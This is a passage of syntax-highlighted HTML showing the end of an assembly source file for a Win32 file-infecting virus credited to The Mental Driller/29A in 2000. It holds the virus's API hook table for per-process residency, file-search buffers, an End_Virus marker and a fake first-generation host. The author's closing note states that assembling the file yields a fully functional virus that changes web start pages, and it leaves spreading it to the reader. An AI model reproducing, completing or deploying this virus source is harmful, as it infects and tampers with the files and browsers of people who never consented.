</span><span class="sc1">;; This is the space that we use to store the addresses to the API functions.</span><span class="sc0">
</span><span class="sc5">FunctionsToPatch</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">RVA_GetProcAddress</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; This first 15 are used for per-process</span><span class="sc0">
</span><span class="sc5">RVA_CreateFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; residency</span><span class="sc0">
</span><span class="sc5">RVA_CreateProcessA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_FindFirstFileA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_FindNextFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_GetFileAttributesA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_SetFileAttributesA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_GetFullPathNameA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_MoveFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_CopyFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_DeleteFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_WinExec</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA__lopen</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_MoveFileExA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_OpenFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_ExitProcess</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">RVA_WriteProcessMemory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_GetCurrentProcess</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_CreateFileMappingA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_MapViewOfFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_UnmapViewOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_CloseHandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_SetFilePointer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_GetFileTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_SetFileTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_GetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_GetSystemDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_GetSystemTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_LoadLibraryA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_FindClose</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_WriteFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA_FreeLibrary</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NumberOfFunctions</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FunctionsToPatch</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">         </span><span class="sc1">; Align (for memory accesses in the decryptor)</span><span class="sc0">

</span><span class="sc5">SystemTime</span><span class="sc0">              </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
  </span><span class="sc5">Year</span><span class="sc0">                  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Month</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">DayOfWeek</span><span class="sc0">             </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Day</span><span class="sc0">                   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Hours</span><span class="sc0">                 </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Minutes</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Seconds</span><span class="sc0">               </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Miliseconds</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">org</span><span class="sc0">     </span><span class="sc5">SystemTime</span><span class="sc0">

</span><span class="sc5">FindFileField</span><span class="sc0">           </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
  </span><span class="sc5">FileAttributes</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">CreationTime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">LastAccessTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">LastWriteTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">FileSizeHigh</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">FileSizeLow</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">Reserved</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">FileName</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">104h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">AlternateFileName</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">FindFileFieldSize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FindFileField</span><span class="sc0">

</span><span class="sc5">FileTime</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc9">align</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">    </span><span class="sc1">; Align on a 4-byte boundary to give the virus</span><span class="sc0">
                             </span><span class="sc1">; a size multiple of 4</span><span class="sc0">
</span><span class="sc5">End_Virus</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc1">;; The virus ends here</span><span class="sc0">

</span><span class="sc1">;; This is a fake host that only says that you have been infected and then</span><span class="sc0">
</span><span class="sc1">;; you are stupid for playing with files of unknown source :P (only first</span><span class="sc0">
</span><span class="sc1">;; generation!)</span><span class="sc0">
</span><span class="sc5">FakedHost</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Titulo</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Mensaje</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; Complete to avoid exceptions when</span><span class="sc0">
                                         </span><span class="sc1">; zeroing on first generation</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">TuaregMain</span><span class="sc0">    </span><span class="sc1">; End directive</span><span class="sc0">

</span><span class="sc5">It</span><span class="sc13">'s curious, but when you put the END directive under TASM, you can write
</span><span class="sc5">whatever</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">want</span><span class="sc0"> </span><span class="sc5">after</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">won</span><span class="sc12">'t be considered (I'</span><span class="sc5">m</span><span class="sc0"> </span><span class="sc5">writing</span><span class="sc0"> </span><span class="sc5">without</span><span class="sc0">
</span><span class="sc5">semicolons</span><span class="sc0">! </span><span class="sc4">:)</span><span class="sc0">

</span><span class="sc5">dsadjshajkdhsajkd</span><span class="sc0">
</span><span class="sc5">dsa</span><span class="sc0">
</span><span class="sc5">fds</span><span class="sc0">
</span><span class="sc5">fds</span><span class="sc0">
</span><span class="sc5">afdsa</span><span class="sc0">   </span><span class="sc4">:</span><span class="sc5">P</span><span class="sc0">

</span><span class="sc4">(</span><span class="sc10">c</span><span class="sc4">)</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Mental</span><span class="sc0"> </span><span class="sc5">Driller</span><span class="sc4">/</span><span class="sc2">29A</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">somewhen</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">November</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">

</span><span class="sc9">This</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">research</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">educational</span><span class="sc0"> </span><span class="sc5">purposes.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">assembling</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0">
</span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">file</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">produce</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">fully</span><span class="sc0"> </span><span class="sc5">functional</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">so</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">been</span><span class="sc0"> </span><span class="sc5">warned</span><span class="sc0">! </span><span class="sc9">If</span><span class="sc0">
</span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">kind</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">material</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">illegal</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">country</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">state</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">should</span><span class="sc0"> </span><span class="sc5">remove</span><span class="sc0">
</span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">your</span><span class="sc0"> </span><span class="sc5">computer.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">author</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">declines</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">illegal</span><span class="sc0"> </span><span class="sc5">activity</span><span class="sc0">
</span><span class="sc5">including</span><span class="sc0"> </span><span class="sc5">possesion</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc4">/</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">spreading</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">possesor</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">sourced</span><span class="sc0">
</span><span class="sc5">here.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">spreading</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">could</span><span class="sc0"> </span><span class="sc5">save</span><span class="sc0"> </span><span class="sc5">any</span><span class="sc0"> </span><span class="sc5">life</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">receives</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">money</span><span class="sc0">
</span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">anyone</span><span class="sc0"> </span><span class="sc5">who</span><span class="sc0"> </span><span class="sc5">got</span><span class="sc0"> </span><span class="sc5">his</span><span class="sc4">/</span><span class="sc5">her</span><span class="sc0"> </span><span class="sc5">web</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0"> </span><span class="sc9">page</span><span class="sc0"> </span><span class="sc5">changed</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">used</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">http</span><span class="sc4">://</span><span class="sc5">www.thehungersite.com</span><span class="sc0"> </span><span class="sc5">donation</span><span class="sc0"> </span><span class="sc5">services</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">but</span><span class="sc0"> </span><span class="sc5">since</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">spreading</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0">
</span><span class="sc5">illegal</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">majority</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">world</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">theorically</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">should</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0">
</span><span class="sc5">spreaded.</span><span class="sc0"> </span><span class="sc5">So</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc5">what</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">want</span><span class="sc0"> </span><span class="sc4">:),</span><span class="sc0"> </span><span class="sc5">but</span><span class="sc0"> </span><span class="sc5">I</span><span class="sc13">'m not responsible.
</span></div></body>
</html>
